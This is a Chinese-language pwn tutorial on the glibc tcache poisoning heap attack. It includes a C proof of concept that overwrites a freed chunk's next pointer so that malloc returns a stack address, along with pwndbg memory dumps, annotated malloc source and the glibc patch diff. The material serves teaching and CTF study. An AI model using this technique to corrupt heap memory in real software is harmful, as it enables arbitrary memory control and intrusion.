# 简介
之前我们说过tcache_poisoning这种攻击方式：

[PWN入门（3-16-1）-Tcache Attack中的Tcache Poisoning（基础）](https://www.yuque.com/cyberangel/rg9gdm/dpcqb8)

这里再来简单的说一下，我们通过堆溢出或UAF修改tcachebin中的free chunk的next指针进而malloc申请控制任意内存的地址。当然tcache_poisoning和fastbin中修改fd指针的效果是一样的，但是所需要绕过的检查是不相同的，这里我们之后再说。

# 漏洞影响版本
所有启用tcachebin机制的glibc malloc

# POC
## POC-glibc-2.27、glibc-2.29
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// disable buffering
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
		   "returning a pointer to an arbitrary location (in this case, the stack).\n"
		   "The attack is very similar to fastbin corruption attack.\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
		   "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");

	size_t stack_var;
	printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

	printf("Allocating 2 buffers.\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("Freeing the buffers...\n");
	free(a);
	free(b);

	printf("Now the tcache list has [ %p -> %p ].\n", b, a);
	printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		   "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);
	b[0] = (intptr_t)&stack_var;
	printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);

	printf("1st malloc(128): %p\n", malloc(128));
	printf("Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);
	printf("We got the control\n");

	assert((long)&stack_var == (long)c);
	return 0;
}
```

编译之后我们来大致调试来看一下，我们对代码第27行下断点然后启动：

```c
pwndbg> x/120gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000091 #a(malloc)
......
0x5555557572e0:	0x0000000000000000	0x0000000000000091 #b(malloc)
......
0x555555757370:	0x0000000000000000	0x0000000000020c91 #top_chunk
......
0x5555557573b0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后释放a、b这两个堆块：

```c
pwndbg> x/120gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000091 #a(free)
0x555555757260:	0x0000000000000000	0x0000555555757010
......
0x5555557572e0:	0x0000000000000000	0x0000000000000091 #b(free)
0x5555557572f0:	0x0000555555757260	0x0000555555757010
......
0x555555757370:	0x0000000000000000	0x0000000000020c91 #top_chunk
0x5555557573b0:	0x0000000000000000	0x0000000000000000
pwndbg> tcachebin
tcachebins
0x90 [  2]: 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
pwndbg> 
```

然后我们修改b堆块的next指针b[0] = (intptr_t)&stack_var：

```c
pwndbg> tcachebin
tcachebins
0x90 [  2]: 0x5555557572f0 —▸ 0x7fffffffdd88 ◂— 0x0
pwndbg> 
```

当我们再次申请两个堆块时即可控制任意内存：

```c
	printf("1st malloc(128): %p\n", malloc(128));
	printf("Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *c = malloc(128);
```

# ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619483439110-21dedbbf-dd96-4f47-8b48-826ec813d21b.png)
## malloc源码说明
之前说过我们可以通过堆溢出或UAF来修改next指针，因此问题主要出在malloc申请时安全性检查不严格：

```c
----------------------------------------------------------------------------
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes); //获取对齐后的大小tbytes
  size_t tc_idx = csize2tidx (tbytes);  //获取tc_idx索引

  MAYBE_INIT_TCACHE (); //初始化tcache

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins  //判断待释放的堆块是否可以放入tcachebin中
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache //判断tcache是否初始化
      && tcache->entries[tc_idx] != NULL) //对应的tcachebin链表不为空
    {
      return tcache_get (tc_idx); //从tcache中申请chunk
    }
  DIAG_POP_NEEDS_COMMENT;
#endif
----------------------------------------------------------------------------
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];  //获取对应链表的entries（e指向free chunk）
  assert (tc_idx < TCACHE_MAX_BINS); //tc_idx一定小于TCACHE_MAX_BINS
  assert (tcache->entries[tc_idx] > 0); //最后插入此tcachebin的free chunk地址一定大于0
  tcache->entries[tc_idx] = e->next; //解链最后进入的free chunk
  --(tcache->counts[tc_idx]); //counts--
  e->key = NULL; //设置解链后free chunk的key指针
  return (void *) e;
}
```

从上面的源码看到，在向tcachebin申请堆块时几乎没有安全性检查，它连链入tcachebin的free chunk大小的检查都没有，以下是fastbin的在申请时对大小的检查：

```c
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0)) //大小检查
		malloc_printerr ("malloc(): memory corruption (fast)");
```

# 漏洞修补方式
漏洞修补方式可以在POC的注释中可以找到：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619485924588-212d856f-a1ba-4b28-930f-eea147a4ae72.png)

```c
-  assert (tcache->entries[tc_idx] > 0);
+  assert (tcache->counts[tc_idx] > 0);
```

在diff中可以看到将原有的assert的内容替换为对tcache->counts[tc_idx]>0的检查，因为在解链之前tcache->counts[tc_idx]总是大于0的；然而这种修补方式只能控制我们在篡改next指针后申请堆块的次数，并不能控制根本的控制此漏洞的利用方式。

总结一下，虽然控制了malloc的次数，但是没有从根本上修补tcache_poisoning这种攻击方式。

